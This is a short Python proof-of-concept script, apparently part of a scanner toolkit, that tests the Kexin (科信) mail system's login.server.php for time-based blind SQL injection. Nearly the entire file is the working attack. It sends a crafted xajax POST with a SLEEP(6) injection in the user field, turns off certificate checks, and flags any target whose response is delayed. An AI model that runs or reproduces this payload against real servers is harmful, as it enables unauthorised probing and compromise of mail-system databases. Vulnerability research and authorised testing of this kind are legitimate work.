#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 科信邮件系统login.server.php 时间盲注
referer: http://www.wooyun.org/bugs/wooyun-2010-0122071
author: Lucifer
description: 文件prog/login.server.php中,参数xjxargs存在SQL注入。
'''
import sys
import time
import json
import requests
import warnings
from termcolor import cprint

class kxmail_login_server_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/prog/login.server.php"
        vulnurl = self.url + payload
        post_data = {
            "xjxfun":"Function_PostLogin",
            "xjxr":"1434907361662",
            "xjxargs[]":"<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139' AND(SELECT * FROM (SELECT(SLEEP(6)))taSu) AND 'dwkL'='dwkL</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
        }
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在科信邮件系统login.server.php 时间盲注漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = kxmail_login_server_sqli_BaseVerify(sys.argv[1])
    testVuln.run()